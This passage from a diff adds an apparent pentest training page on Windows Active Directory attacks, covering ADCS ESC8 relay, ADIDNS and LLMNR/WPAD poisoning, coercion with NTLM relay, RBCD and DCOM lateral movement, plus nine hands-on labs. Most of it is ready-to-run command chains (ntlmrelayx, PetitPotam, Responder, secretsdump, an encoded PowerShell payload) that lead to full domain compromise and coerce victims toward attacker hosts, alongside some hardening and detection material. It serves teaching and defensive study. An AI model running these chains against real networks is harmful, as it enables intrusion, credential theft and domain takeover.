+  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
+  "(objectClass=pKIEnrollmentService)" cn dNSHostName certificateTemplates
+
+# Find vulnerable certificate templates
+# Certipy (recommended)
+certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.1
+certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable
+
+# ESC8: NTLM relay to ADCS HTTP enrollment
+# 1. Start relay targeting CA web enrollment
+impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
+# 2. Coerce DC authentication (PetitPotam/PrinterBug)
+python3 PetitPotam.py attacker_ip dc01.corp.local
+# 3. Relay captures cert for DC machine account
+# 4. Use cert to authenticate as DC
+certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1</code></pre>
+
+      <hr>
+
+      <!-- ===== DNS ===== -->
+      <h2>DNS in Windows / Active Directory</h2>
+
+      <h3>AD-Integrated DNS Zones</h3>
+      <p>AD-integrated DNS stores zone data in the AD database (not flat zone files). Replication follows AD topology. Benefits: secure dynamic updates, no zone transfer needed (replicates with AD), ACL-based access control.</p>
+      <ul>
+        <li><strong>Forward Lookup Zones:</strong> Hostname → IP resolution. <code>_msdcs.domain.local</code> holds DC locator records.</li>
+        <li><strong>Reverse Lookup Zones:</strong> IP → Hostname. Often neglected in AD environments.</li>
+        <li><strong>Application Partitions:</strong> <code>DomainDnsZones</code> (domain-wide), <code>ForestDnsZones</code> (forest-wide) control replication scope.</li>
+        <li><strong>SRV Records:</strong> <code>_ldap._tcp.dc._msdcs.domain.local</code>, <code>_kerberos._tcp.domain.local</code>, <code>_gc._tcp.domain.local</code> — critical for domain operations.</li>
+      </ul>
+
+      <h3>Dynamic DNS Updates</h3>
+      <pre><code class="language-powershell"># By default, any authenticated user can create DNS records
+# Machine accounts auto-register A/AAAA records on join
+# DHCP can perform dynamic updates on behalf of clients
+
+# Check who can create DNS records
+Get-DnsServerZone -Name "corp.local" | Select-Object DynamicUpdate
+# Secure = only authenticated machines; Nonsecure/Secure = anyone (dangerous)
+
+# View DNS ACLs
+Get-Acl "AD:\DC=corp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local" | Format-List</code></pre>
+
+      <h3>DNS Poisoning in AD (ADIDNS Abuse)</h3>
+      <pre><code class="language-bash"># ADIDNS - any authenticated user can create new DNS records by default
+# Abuse: add wildcard record (*) to catch all LLMNR-style queries
+
+# Enumerate existing records
+python3 dnstool.py -u 'corp.local\user' -p 'Password123' dc01.corp.local -a query -r '*'
+
+# Add a wildcard record pointing to attacker
+python3 dnstool.py -u 'corp.local\user' -p 'Password123' dc01.corp.local \
+  -a add -r '*.corp.local' -d attacker_ip -t A
+
+# Add specific record (e.g., for WPAD)
+python3 dnstool.py -u 'corp.local\user' -p 'Password123' dc01.corp.local \
+  -a add -r 'wpad.corp.local' -d attacker_ip -t A
+
+# Remove record (cleanup)
+python3 dnstool.py -u 'corp.local\user' -p 'Password123' dc01.corp.local \
+  -a remove -r '*.corp.local' -d attacker_ip -t A
+
+# adidnsdump - dump all AD-integrated DNS records
+adidnsdump -u 'corp.local\user' -p 'Password123' dc01.corp.local
+adidnsdump -u 'corp.local\user' -p 'Password123' dc01.corp.local --forest  # Forest zone</code></pre>
+
+      <h3>LLMNR / NBT-NS / mDNS Poisoning</h3>
+      <p>When DNS resolution fails, Windows falls back to broadcast/multicast protocols. An attacker on the local network can respond to these queries and capture NTLMv2 hashes.</p>
+      <ul>
+        <li><strong>LLMNR (Link-Local Multicast Name Resolution):</strong> UDP/5355. Multicast to 224.0.0.252. Used by Win Vista+.</li>
+        <li><strong>NBT-NS (NetBIOS Name Service):</strong> UDP/137. Broadcast on local subnet. Legacy protocol.</li>
+        <li><strong>mDNS (Multicast DNS):</strong> UDP/5353. Multicast to 224.0.0.251. Used by Apple/Linux, present on Win 10+.</li>
+      </ul>
+
+      <pre><code class="language-bash"># Responder - capture NTLM hashes from broadcast poisoning
+# Start with all poisoners enabled
+sudo responder -I eth0 -dwPv
+
+# Responder - only poison specific protocols
+sudo responder -I eth0 --llmnr --nbtns
+
+# Responder - serve WPAD proxy file
+sudo responder -I eth0 -wFP
+
+# Captured hashes are saved to /usr/share/responder/logs/
+# Crack NTLMv2 hashes
+hashcat -m 5600 hash.txt wordlist.txt
+
+# Mitigation detection - check if LLMNR is disabled via GPO
+# GPO: Computer Config → Admin Templates → Network → DNS Client
+# "Turn off multicast name resolution" = Enabled</code></pre>
+
+      <h3>WPAD (Web Proxy Auto-Discovery) Abuse</h3>
+      <pre><code class="language-bash"># WPAD allows automatic proxy configuration via:
+# 1. DHCP option 252
+# 2. DNS query for wpad.domain.local
+# 3. LLMNR/NBT-NS fallback
+
+# Attack: Register wpad DNS record or poison LLMNR, serve malicious PAC file
+# The PAC file can redirect traffic through attacker proxy
+
+# Responder WPAD attack (captures NTLM auth during PAC download)
+sudo responder -I eth0 -wFP
+# -w = start WPAD rogue proxy
+# -F = force NTLM auth on wpad.dat download
+# -P = force proxy auth after PAC download
+
+# mitm6 + WPAD (IPv6-based)
+sudo mitm6 -d corp.local
+# Combined with ntlmrelayx:
+impacket-ntlmrelayx -6 -t ldap://dc01.corp.local -wh wpad.attacker.local --delegate-access</code></pre>
+
+      <hr>
+
+      <!-- ===== TLS/Schannel ===== -->
+      <h2>TLS / Schannel</h2>
+
+      <h3>Schannel Overview</h3>
+      <p>Schannel (Secure Channel) is the Windows TLS/SSL implementation (Security Support Provider). Used by IIS, LDAPS, RDP, WinHTTP, WinRM, and all Windows components requiring TLS.</p>
+
+      <h3>TLS Version Configuration</h3>
+      <pre><code class="language-powershell"># Registry path for protocol versions:
+# HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\
+
+# Disable TLS 1.0
+New-Item "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" -Force
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" `
+  -Name "Enabled" -Value 0 -PropertyType DWord
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" `
+  -Name "DisabledByDefault" -Value 1 -PropertyType DWord
+
+# Disable TLS 1.1
+New-Item "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server" -Force
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server" `
+  -Name "Enabled" -Value 0 -PropertyType DWord
+
+# Enable TLS 1.3 (Windows Server 2022+)
+New-Item "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server" -Force
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server" `
+  -Name "Enabled" -Value 1 -PropertyType DWord
+
+# Check current TLS configuration
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\*\Server" -ErrorAction SilentlyContinue
+
+# IISCrypto (GUI tool) or PowerShell DSC for bulk TLS config
+# Cipher suite ordering via GPO:
+# Computer Config → Admin Templates → Network → SSL Configuration Settings
+# → SSL Cipher Suite Order</code></pre>
+
+      <h3>Certificate Management</h3>
+      <pre><code class="language-powershell"># Certificate stores
+# certlm.msc → Local Machine certificates
+# certmgr.msc → Current User certificates
+
+# List machine certificates
+Get-ChildItem Cert:\LocalMachine\My | Select-Object Subject, Thumbprint, NotAfter
+
+# Export certificate (public key)
+Export-Certificate -Cert (Get-ChildItem Cert:\LocalMachine\My\THUMBPRINT) -FilePath C:\cert.cer
+
+# Check certificate chain
+Test-NetConnection -ComputerName target -Port 443
+# Or with OpenSSL:
+# openssl s_client -connect target:443 -showcerts
+
+# Certificate-based authentication (PKINIT)
+# Requires smartcard or virtual smartcard certificate
+# Abused in ADCS attacks (ESC1-ESC8): obtain cert, auth as any user
+certipy auth -pfx admin.pfx -dc-ip 10.10.10.1 -username administrator -domain corp.local</code></pre>
+
+      <h3>TLS Downgrade Attacks</h3>
+      <ul>
+        <li><strong>POODLE (CVE-2014-3566):</strong> Forces SSL 3.0 fallback, exploits CBC padding. Mitigate: disable SSL 3.0.</li>
+        <li><strong>BEAST (CVE-2011-3389):</strong> CBC mode vulnerability in TLS 1.0. Mitigate: prefer TLS 1.2+, use GCM ciphers.</li>
+        <li><strong>FREAK/Logjam:</strong> Force export-grade cryptography. Mitigate: disable DHE_EXPORT, RSA_EXPORT cipher suites.</li>
+        <li><strong>ROBOT (CVE-2017-13099):</strong> Bleichenbacher oracle on RSA key exchange. Mitigate: disable RSA key exchange.</li>
+      </ul>
+
+      <hr>
+
+      <!-- ===== IPSec & WFP ===== -->
+      <h2>IPSec &amp; Windows Filtering Platform</h2>
+
+      <h3>Windows Filtering Platform (WFP) Architecture</h3>
+      <p>WFP is the network filtering framework in Windows (Vista+). It replaces the older NDIS filter drivers. All Windows firewall rules, IPSec policies, and third-party security products hook into WFP.</p>
+      <ul>
+        <li><strong>Filter Engine:</strong> Kernel-mode component that evaluates packets against filter rules at various layers.</li>
+        <li><strong>Layers:</strong> Inbound/Outbound at Transport, Network, ALE (Application Layer Enforcement), Stream layers.</li>
+        <li><strong>Callouts:</strong> Kernel drivers that perform deep inspection/modification (antivirus, DLP, etc.).</li>
+        <li><strong>Base Filtering Engine (BFE):</strong> User-mode service managing filter/policy database.</li>
+      </ul>
+
+      <pre><code class="language-powershell"># View WFP filters
+netsh wfp show filters
+netsh wfp show state
+
+# Windows Firewall (built on WFP)
+Get-NetFirewallRule | Where-Object Enabled -eq True | Select-Object DisplayName, Direction, Action
+Get-NetFirewallRule -DisplayName "*SMB*"
+
+# Advanced: dump WFP callouts (useful for understanding security products)
+netsh wfp show callouts</code></pre>
+
+      <h3>IPSec Policies</h3>
+      <pre><code class="language-powershell"># IPSec in Windows uses IKE (Internet Key Exchange) for negotiation
+# Configured via: Local Security Policy, GPO, or PowerShell (New-NetIPsecRule)
+
+# Create IPSec rule requiring authentication for SMB
+New-NetIPsecRule -DisplayName "Require Auth for SMB" `
+  -InboundSecurity Require -OutboundSecurity Require `
+  -Protocol TCP -LocalPort 445
+
+# Connection Security Rules (Windows Firewall with Advanced Security)
+# Isolation: require auth for inbound connections
+New-NetIPsecRule -DisplayName "Domain Isolation" `
+  -InboundSecurity Require -OutboundSecurity Request `
+  -Phase1AuthSet (New-NetIPsecAuthProposal -Machine -Cert -Authority "DC=corp,DC=local")
+
+# View active IPSec SAs (Security Associations)
+Get-NetIPsecMainModeSA
+Get-NetIPsecQuickModeSA
+
+# Troubleshoot IPSec
+netsh ipsec dynamic show all
+# Event Viewer: Applications and Services Logs → Microsoft → Windows → WFP</code></pre>
+
+      <h3>Network Isolation</h3>
+      <pre><code class="language-powershell"># Server/Domain Isolation via IPSec
+# Concept: machines that cannot prove domain membership are blocked
+# Implementation: GPO-deployed connection security rules
+
+# Check if isolation is active
+Get-NetConnectionProfile | Select-Object Name, NetworkCategory
+Get-NetIPsecRule | Where-Object {$_.Enabled -eq $true} | Select-Object DisplayName, InboundSecurity
+
+# Bypass considerations for pentesters:
+# 1. Compromise a domain-joined machine first
+# 2. IPSec exemptions (often exists for DCs, DHCP, DNS)
+# 3. Null encapsulation (auth only, no encryption) still allows sniffing</code></pre>
+
+      <hr>
+
+      <!-- ===== Authentication Coercion ===== -->
+      <h2>Authentication Coercion — Complete Reference</h2>
+
+      <h3>Coercion + Relay Attack Chains</h3>
+      <p>The most devastating Windows network attacks combine <strong>authentication coercion</strong> (forcing a privileged machine to authenticate to you) with <strong>NTLM relay</strong> (forwarding that auth to a target service). The classic chain:</p>
+      <ol>
+        <li>Coerce a DC to authenticate to attacker (PrinterBug/PetitPotam)</li>
+        <li>Relay captured NTLM auth to ADCS HTTP enrollment (ESC8)</li>
+        <li>Obtain a certificate for the DC machine account</li>
+        <li>Use the certificate to authenticate as the DC (PKINIT)</li>
+        <li>DCSync all domain hashes → full domain compromise</li>
+      </ol>
+
+      <pre><code class="language-bash"># Complete ESC8 Attack Chain:
+
+# Step 1: Start ntlmrelayx targeting ADCS web enrollment
+impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# Step 2: Coerce DC authentication
+python3 PetitPotam.py attacker_ip dc01.corp.local
+# OR
+python3 printerbug.py corp.local/user:pass@dc01.corp.local attacker_ip
+
+# Step 3: ntlmrelayx enrolls cert as DC01$ → outputs base64 cert
+
+# Step 4: Authenticate with the certificate
+certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
+# Outputs NT hash for DC01$ machine account
+
+# Step 5: DCSync with the DC hash
+impacket-secretsdump -hashes :NTHASH corp.local/dc01\$@dc01.corp.local</code></pre>
+
+      <h3>Coercion + RBCD Chain</h3>
+      <pre><code class="language-bash"># When ADCS is not available, relay to LDAP for RBCD:
+
+# Step 1: Create a machine account (or use existing controlled account)
+impacket-addcomputer corp.local/user:pass -computer-name 'FAKEPC$' -computer-pass 'FakePass123'
+
+# Step 2: Start relay targeting LDAP, configuring RBCD on the coerced machine
+impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access --escalate-user 'FAKEPC$'
+
+# Step 3: Coerce target machine
+python3 PetitPotam.py attacker_ip target.corp.local
+
+# Step 4: ntlmrelayx sets msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$
+
+# Step 5: Request service ticket via S4U2Self + S4U2Proxy
+impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
+  corp.local/'FAKEPC$':'FakePass123'
+
+# Step 6: Use the ticket
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local</code></pre>
+
+      <h3>Defenses Against Coercion + Relay</h3>
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr><th>Defense</th><th>What It Blocks</th><th>How to Enable</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>SMB Signing (Required)</td>
+            <td>SMB → SMB relay</td>
+            <td>GPO: Require signing on all machines</td>
+          </tr>
+          <tr>
+            <td>LDAP Signing (Required)</td>
+            <td>* → LDAP relay</td>
+            <td>DC registry: LDAPServerIntegrity = 2</td>
+          </tr>
+          <tr>
+            <td>LDAP Channel Binding</td>
+            <td>* → LDAPS relay</td>
+            <td>DC registry: LdapEnforceChannelBinding = 2</td>
+          </tr>
+          <tr>
+            <td>EPA (Extended Protection for Authentication)</td>
+            <td>* → HTTP/HTTPS relay (ADCS, Exchange)</td>
+            <td>Enable on IIS/ADCS web enrollment: require channel binding token</td>
+          </tr>
+          <tr>
+            <td>Disable NTLM</td>
+            <td>All NTLM relay</td>
+            <td>GPO: Restrict NTLM → Deny all. Requires full Kerberos coverage.</td>
+          </tr>
+          <tr>
+            <td>Disable Print Spooler</td>
+            <td>PrinterBug coercion</td>
+            <td><code>Stop-Service Spooler; Set-Service Spooler -StartupType Disabled</code></td>
+          </tr>
+          <tr>
+            <td>Patch MS-EFSR</td>
+            <td>Unauthenticated PetitPotam</td>
+            <td>Install latest Windows patches</td>
+          </tr>
+          <tr>
+            <td>Protected Users group</td>
+            <td>NTLM auth for group members</td>
+            <td>Add privileged accounts to Protected Users security group</td>
+          </tr>
+        </tbody>
+      </table>
+
+    </div>
+
+    <!-- ==================== LABS TAB ==================== -->
+    <div class="tab-pane fade" id="lab" role="tabpanel" aria-labelledby="lab-tab">
+
+      <h2>Labs</h2>
+
+      <!-- Lab 1 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 1: SMB Enumeration &amp; Share Hunting</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Enumerate SMB shares across a network, identify accessible shares, and discover sensitive files.</p>
+          <p><strong>Setup:</strong> Windows Server with multiple shares (some with read access for "Everyone", some restricted). Files containing credentials, SSH keys, and config files scattered across shares.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Discover SMB hosts
+crackmapexec smb 10.10.10.0/24
+
+# 2. Enumerate shares with valid credentials
+crackmapexec smb 10.10.10.50 -u jdoe -p 'Summer2024!' --shares
+
+# 3. Identify permissions (READ/WRITE)
+smbmap -H 10.10.10.50 -u jdoe -p 'Summer2024!'
+
+# 4. Spider shares for sensitive content
+crackmapexec smb 10.10.10.50 -u jdoe -p 'Summer2024!' -M spider_plus \
+  -o EXCLUDE_DIR=Windows,Program\ Files
+
+# 5. Use Snaffler for automated hunting
+Snaffler.exe -s -d corp.local -o snaffler_results.log -i 10.10.10.50
+
+# 6. Manual inspection of interesting files
+smbclient //10.10.10.50/IT_Share -U 'corp.local\jdoe%Summer2024!'
+smb: \> get scripts\deploy.ps1
+smb: \> get configs\web.config</code></pre>
+          <p><strong>Expected Results:</strong> Discover cleartext passwords in scripts, database connection strings in config files, and SSH private keys in user home directories.</p>
+        </div>
+      </div>
+
+      <!-- Lab 2 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 2: NTLM Relay — SMB to SMB</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Perform an NTLM relay attack from one workstation to another where SMB signing is not required.</p>
+          <p><strong>Setup:</strong> Two Windows workstations (WS01, WS02) without SMB signing enforcement. WS01 user has local admin on WS02.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Identify targets without SMB signing
+crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
+cat targets.txt  # Should include WS02
+
+# 2. Start ntlmrelayx targeting WS02
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami > C:\\relay_proof.txt"
+
+# 3. Coerce WS01 to authenticate to attacker
+# Method A: Send phishing email with UNC path (\\attacker\share)
+# Method B: Use Responder to poison name resolution
+sudo responder -I eth0 --llmnr --nbtns
+
+# 4. Verify relay success
+# ntlmrelayx output shows "Executed command" on WS02
+# Connect to verify
+smbclient //10.10.10.52/C$ -U 'corp\admin%pass'
+smb: \> get relay_proof.txt
+
+# 5. Get interactive shell via relay
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+# When relay fires: nc 127.0.0.1 11000</code></pre>
+          <p><strong>Key Takeaway:</strong> SMB signing is the primary defense against SMB-to-SMB relay. Without it, any captured NTLM auth can be relayed.</p>
+        </div>
+      </div>
+
+      <!-- Lab 3 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 3: NTLM Relay to LDAP — RBCD Attack</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Relay coerced authentication to LDAP and configure Resource-Based Constrained Delegation for privilege escalation.</p>
+          <p><strong>Setup:</strong> DC without LDAP signing enforcement (default). Target server with Spooler service running.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Add a machine account (MAQ default is 10)
+impacket-addcomputer corp.local/jdoe:'Summer2024!' -computer-name 'ATTACKER$' \
+  -computer-pass 'AttackerPass1!'
+
+# 2. Start ntlmrelayx for RBCD delegation
+impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access \
+  --escalate-user 'ATTACKER$' -smb2support
+
+# 3. Trigger authentication coercion from target server
+python3 printerbug.py corp.local/jdoe:'Summer2024!'@fileserver.corp.local attacker_ip
+
+# 4. ntlmrelayx modifies fileserver$ msDS-AllowedToActOnBehalfOfOtherIdentity
+# Verify:
+python3 rbcd.py -delegate-to 'FILESERVER$' -delegate-from 'ATTACKER$' \
+  -action read corp.local/jdoe:'Summer2024!'
+
+# 5. Perform S4U attack to get service ticket
+impacket-getST -spn cifs/fileserver.corp.local -impersonate Administrator \
+  corp.local/'ATTACKER$':'AttackerPass1!'
+
+# 6. Use ticket for access
+export KRB5CCNAME=Administrator.ccache
+impacket-smbexec -k -no-pass corp.local/Administrator@fileserver.corp.local</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 4 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 4: PetitPotam + ADCS ESC8 — Domain Takeover</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Chain PetitPotam coercion with NTLM relay to ADCS HTTP enrollment to obtain a DC certificate and compromise the domain.</p>
+          <p><strong>Setup:</strong> Domain with ADCS web enrollment enabled (HTTP, not HTTPS with EPA). DC with MS-EFSR accessible.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Verify ADCS web enrollment is accessible
+curl -I http://ca01.corp.local/certsrv/
+# Should return 401 (waiting for auth)
+
+# 2. Check available templates
+certipy find -u jdoe@corp.local -p 'Summer2024!' -dc-ip 10.10.10.1 -stdout | grep -A5 "Template Name"
+
+# 3. Start ntlmrelayx targeting ADCS
+impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# 4. Coerce DC authentication via PetitPotam
+python3 PetitPotam.py attacker_ip dc01.corp.local
+# Or authenticated:
+python3 PetitPotam.py -u jdoe -p 'Summer2024!' -d corp.local attacker_ip dc01.corp.local
+
+# 5. ntlmrelayx obtains certificate for DC01$
+# Output: "Certificate for DC01$ saved to dc01.pfx" (base64)
+
+# 6. Authenticate using the certificate
+certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
+# Output: NT hash for DC01$ machine account
+
+# 7. DCSync
+impacket-secretsdump -hashes :MACHINE_NTHASH corp.local/'DC01$'@dc01.corp.local
+# Extract: Administrator:500:aad3b435...:NTHASH:::</code></pre>
+          <p><strong>Impact:</strong> Full domain compromise from a single coercion vulnerability + misconfigured ADCS.</p>
+        </div>
+      </div>
+
+      <!-- Lab 5 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 5: Responder — LLMNR/NBT-NS Poisoning &amp; Hash Capture</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Capture NTLMv2 hashes by poisoning broadcast name resolution protocols and crack them offline.</p>
+          <p><strong>Setup:</strong> Network segment with LLMNR/NBT-NS enabled (default). Users accessing non-existent shares/hosts.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Start Responder in analyze mode first (passive, no poisoning)
+sudo responder -I eth0 -A
+# Observe which protocols are active and which queries are seen
+
+# 2. Start Responder with poisoning
+sudo responder -I eth0 -dwPv
+# -d = DHCP poisoning
+# -w = WPAD
+# -P = Force proxy auth
+# -v = Verbose
+
+# 3. Wait for (or trigger) name resolution failures
+# Common triggers: typos in UNC paths, stale mapped drives, WPAD queries
+
+# 4. Captured hashes appear in terminal and are logged:
+# /usr/share/responder/logs/SMB-NTLMv2-*.txt
+
+# 5. Crack captured NTLMv2 hashes
+hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 captured_hashes.txt wordlist.txt -r rules/best64.rule
+
+# 6. Alternatively, relay instead of crack
+# Stop Responder's SMB/HTTP servers and use ntlmrelayx
+sudo responder -I eth0 --llmnr --nbtns  # Poison only, don't capture
+impacket-ntlmrelayx -tf targets.txt -smb2support</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 6 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 6: ADIDNS Poisoning — Wildcard Record Injection</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Inject a wildcard DNS record into AD-integrated DNS to capture authentication attempts for non-existent hostnames.</p>
+          <p><strong>Setup:</strong> Standard AD environment where authenticated users can create DNS records (default).</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Check if wildcard record already exists
+python3 dnstool.py -u 'corp.local\jdoe' -p 'Summer2024!' dc01.corp.local \
+  -a query -r '*.corp.local'
+
+# 2. Add wildcard A record pointing to attacker
+python3 dnstool.py -u 'corp.local\jdoe' -p 'Summer2024!' dc01.corp.local \
+  -a add -r '*.corp.local' -d 10.10.10.200 -t A
+
+# 3. Verify the record was created
+nslookup anythingrandom.corp.local dc01.corp.local
+# Should resolve to 10.10.10.200
+
+# 4. Start Responder/ntlmrelayx on attacker (10.10.10.200)
+sudo responder -I eth0 -v
+# OR for relay:
+impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# 5. Any lookup for non-existent host.corp.local now hits attacker
+# Captures NTLM auth from stale references, scripts, etc.
+
+# 6. Cleanup (important!)
+python3 dnstool.py -u 'corp.local\jdoe' -p 'Summer2024!' dc01.corp.local \
+  -a remove -r '*.corp.local' -d 10.10.10.200 -t A</code></pre>
+          <p><strong>Note:</strong> This is stealthier than LLMNR poisoning as it works across subnets (not just local broadcast domain).</p>
+        </div>
+      </div>
+
+      <!-- Lab 7 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 7: DCOM Lateral Movement</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Execute commands on a remote system using DCOM objects without dropping files on disk (fileless lateral movement).</p>
+          <p><strong>Setup:</strong> Local admin access on target workstation. DCOM enabled (default).</p>
+          <h5>Steps</h5>
+          <pre><code class="language-powershell"># Method 1: MMC20.Application
+$target = "ws02.corp.local"
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
+$com.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, `
+  "-enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC...", "7")
+
+# Method 2: ShellWindows (no process creation via COM itself)
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(
+  "9BA05972-F6A8-11CF-A442-00A0C90A8F39", $target))
+$item = $com.Item()
+$item.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\dcom_proof.txt", "", "", 0)
+
+# Method 3: Impacket dcomexec (from Linux)
+impacket-dcomexec corp.local/admin:'AdminPass!'@ws02.corp.local 'whoami' -object MMC20
+impacket-dcomexec corp.local/admin:'AdminPass!'@ws02.corp.local 'whoami' -object ShellWindows</code></pre>
+          <pre><code class="language-bash"># Detection: Look for DCOM process creation patterns
+# Parent: svchost.exe -k DcomLaunch
+# Child: mmc.exe (for MMC20) or explorer.exe (for ShellWindows)
+# Event ID 4688 with unusual parent-child relationships</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 8 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 8: RPC Enumeration &amp; Interface Discovery</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Enumerate available RPC interfaces on target systems to identify exploitable services (Spooler, EFS, DFS).</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Dump all registered RPC endpoints
+impacket-rpcdump 10.10.10.50 | tee rpc_endpoints.txt
+
+# 2. Check for coercion-vulnerable interfaces
+grep -i "MS-RPRN\|spoolss\|MS-EFSR\|efsrpc\|MS-DFSNM\|netdfs\|MS-FSRVP\|FssAgent" rpc_endpoints.txt
+
+# 3. Detailed enumeration with rpcclient
+rpcclient -U 'corp\jdoe%Summer2024!' 10.10.10.50
+rpcclient $> srvinfo
+rpcclient $> enumdomusers
+rpcclient $> enumdomgroups
+rpcclient $> querygroup 0x200  # Domain Admins
+rpcclient $> querygroupmem 0x200
+rpcclient $> getusrdompwinfo 0x1f4  # Administrator password policy
+
+# 4. Use Coercer to scan for all available coercion methods
+python3 Coercer.py scan -u jdoe -p 'Summer2024!' -d corp.local -t 10.10.10.50
+# Output shows which RPC methods are available on the target
+
+# 5. Enumerate named pipes
+crackmapexec smb 10.10.10.50 -u jdoe -p 'Summer2024!' --pipes</code></pre>
+        </div>
+      </div>
+
+      <!-- Lab 9 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h4>Lab 9: LDAP Enumeration &amp; AD Attack Surface Mapping</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Perform comprehensive AD enumeration via LDAP to identify Kerberoastable accounts, delegation misconfigs, and privileged access paths.</p>
+          <h5>Steps</h5>
+          <pre><code class="language-bash"># 1. Get domain info from rootDSE
+ldapsearch -x -H ldap://dc01.corp.local -b "" -s base "(objectClass=*)" \
+  defaultNamingContext domainFunctionality forestFunctionality
+
+# 2. Enumerate Kerberoastable accounts
+ldapsearch -x -H ldap://dc01.corp.local -D "jdoe@corp.local" -w 'Summer2024!' \
+  -b "DC=corp,DC=local" \
+  "(&amp;(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(cn=krbtgt)))" \
+  sAMAccountName servicePrincipalName memberOf
+
+# 3. Find ASREPRoastable accounts
+ldapsearch -x -H ldap://dc01.corp.local -D "jdoe@corp.local" -w 'Summer2024!' \
+  -b "DC=corp,DC=local" \
+  "(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
+  sAMAccountName
+
+# 4. Unconstrained delegation machines
+ldapsearch -x -H ldap://dc01.corp.local -D "jdoe@corp.local" -w 'Summer2024!' \
+  -b "DC=corp,DC=local" \
+  "(&amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
+  sAMAccountName dNSHostName
+
+# 5. LAPS passwords (if readable)
+ldapsearch -x -H ldap://dc01.corp.local -D "jdoe@corp.local" -w 'Summer2024!' \
+  -b "DC=corp,DC=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime cn
+
+# 6. Full domain dump with ldapdomaindump
+ldapdomaindump -u 'corp.local\jdoe' -p 'Summer2024!' dc01.corp.local -o ./ldap_dump/
+
+# 7. BloodHound collection via LDAP
